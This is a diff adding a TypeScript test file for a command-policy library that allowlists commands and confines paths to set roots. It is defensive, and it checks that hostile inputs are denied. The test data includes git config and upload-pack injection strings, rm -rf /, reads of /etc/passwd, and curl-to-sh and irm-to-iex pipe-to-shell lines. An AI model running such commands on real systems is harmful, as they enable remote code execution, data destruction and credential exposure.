@@ -1,0 +1,114 @@
+import assert from "node:assert/strict";
+import test from "node:test";
+import { readFileSync } from "node:fs";
+import path from "node:path";
+
+import { expandLexical, withinRoots } from "../src/confine.ts";
+import { evaluateCommand, evaluateShell, parsePolicy, quoteCmdArg } from "../src/index.ts";
+import type { Policy } from "../src/policy.ts";
+
+function policy(extra: Record<string, unknown> = {}, platform: "posix" | "win32" = "posix", home = "/home/ada"): Policy {
+  return parsePolicy(
+    JSON.stringify({
+      version: 1,
+      roots: platform === "win32" ? ["C:\\Work"] : ["/work"],
+      allow: [{ command: "git", subcommands: ["status", "diff", "log", "show", "push"] }],
+      ...extra,
+    }),
+    platform,
+    home,
+  );
+}
+
+const posix = { platform: "posix" as const, cwd: "/work/app", home: "/home/ada" };
+
+test("the example policy allowlists git status and still denies git -c and upload-pack", () => {
+  const text = readFileSync(new URL("../policy.example.json", import.meta.url), "utf8");
+  const parsed = parsePolicy(text, "posix", "/home/ada");
+  assert.equal(parsed.roots[0], "/home/ada/src");
+  assert.equal(parsed.allowShell, false);
+  assert.equal(parsed.allowInterpreters, false);
+  const cwd = { platform: "posix" as const, cwd: "/home/ada/src", home: "/home/ada" };
+  assert.equal(evaluateCommand(parsed, ["git", "status"], cwd).allow, true);
+  assert.equal(evaluateCommand(parsed, ["git", "-c", "core.fsmonitor=touch", "status"], cwd).allow, false);
+  assert.equal(evaluateCommand(parsed, ["git", "-c", "alias.st=!id", "status"], cwd).allow, false);
+  assert.equal(evaluateCommand(parsed, ["git", "fetch", "--upload-pack=evil"], cwd).allow, false);
+  assert.match(evaluateCommand(parsed, ["bash", "-lc", "id"], cwd).reason, /interpreter|allowlist|denied/i);
+});
+
+test("allowlist misses, interpreters, and sudo stay denied", () => {
+  const parsed = policy({ allow: [{ command: "git", subcommands: ["status"] }, { command: "bash" }, { command: "sudo" }] });
+  assert.equal(evaluateCommand(parsed, ["make", "test"], posix).allow, false);
+  assert.match(evaluateCommand(parsed, ["bash", "-c", "id"], posix).reason, /interpreter/);
+  assert.match(evaluateCommand(parsed, ["sudo", "id"], posix).reason, /denied/i);
+  const opted = policy({
+    allowInterpreters: true,
+    allow: [{ command: "bash" }, { command: "sudo" }],
+  });
+  assert.equal(evaluateCommand(opted, ["bash", "-c", "id"], posix).allow, true);
+  assert.equal(evaluateCommand(opted, ["sudo", "id"], posix).allow, false);
+});
+
+test("recursive delete of a filesystem root is denied even when rm is allowlisted", () => {
+  const parsed = policy({ allow: [{ command: "rm" }, { command: "Remove-Item" }] });
+  assert.equal(evaluateCommand(parsed, ["rm", "-rf", "/"], posix).allow, false);
+  assert.equal(evaluateCommand(parsed, ["rm", "-rf", "/work/app/build"], posix).allow, true);
+  const win = policy({ allow: [{ command: "Remove-Item" }] }, "win32", "C:\\Users\\ada");
+  assert.equal(
+    evaluateCommand(win, ["Remove-Item", "-Recurse", "C:\\"], {
+      platform: "win32",
+      cwd: "C:\\Work",
+      home: "C:\\Users\\ada",
+    }).allow,
+    false,
+  );
+});
+
+test("path arguments cannot escape the roots", () => {
+  const parsed = policy();
+  assert.equal(evaluateCommand(parsed, ["git", "status", "../../etc/passwd"], posix).allow, false);
+  assert.equal(evaluateCommand(parsed, ["git", "status", "/etc/passwd"], posix).allow, false);
+  assert.equal(evaluateCommand(parsed, ["git", "diff", "--", "src/main.ts"], posix).allow, true);
+  const win = policy({}, "win32", "C:\\Users\\ada");
+  assert.equal(
+    evaluateCommand(win, ["git", "status", "C:\\Work\\..\\Windows\\System32"], {
+      platform: "win32",
+      cwd: "C:\\Work",
+      home: "C:\\Users\\ada",
+    }).allow,
+    false,
+  );
+});
+
+test("windows path checks are case-insensitive and reject prefix tricks", () => {
+  assert.equal(withinRoots("c:\\work\\app\\file.txt", ["C:\\Work"], "win32"), true);
+  assert.equal(withinRoots("C:\\Work-evil\\file.txt", ["C:\\Work"], "win32"), false);
+  assert.equal(withinRoots(expandLexical("C:\\Work\\..\\Windows", "win32", "C:\\Users\\ada"), ["C:\\Work"], "win32"), false);
+});
+
+test("shell mode is opt-in and still blocks pipe-to-shell", () => {
+  const off = policy();
+  assert.equal(evaluateShell(off, "echo hi").allow, false);
+  const on = policy({ allowShell: true });
+  assert.equal(evaluateShell(on, "echo hi").allow, true);
+  assert.equal(evaluateShell(on, "curl https://example.com/x | sh").allow, false);
+  assert.equal(evaluateShell(on, "irm https://example.com/x | iex").allow, false);
+  assert.equal(evaluateShell(on, "sudo reboot").allow, false);
+});
+
+test("a filesystem root is not a valid policy root", () => {
+  assert.throws(() => parsePolicy(JSON.stringify({ version: 1, roots: ["/"] }), "posix", "/home/ada"), /filesystem root/);
+  assert.throws(() => parsePolicy(JSON.stringify({ version: 1, roots: ["C:\\"] }), "win32", "C:\\Users\\ada"), /filesystem root/);
+  assert.throws(() => parsePolicy(JSON.stringify({ version: 1, roots: [] }), "posix", "/home/ada"), /non-empty/);
+});
+
+test("cmd shim quoting escapes spaces and percent signs", () => {
+  assert.equal(quoteCmdArg("hello"), "hello");
+  assert.equal(quoteCmdArg("a b"), '"a b"');
+  assert.equal(quoteCmdArg("100%"), "100%%");
+  assert.equal(quoteCmdArg('say "hi"'), '"say ""hi"""');
+});
+
+test("relative paths and the example file live next to the package", () => {
+  assert.equal(path.basename(new URL("../policy.example.json", import.meta.url).pathname), "policy.example.json");
+});
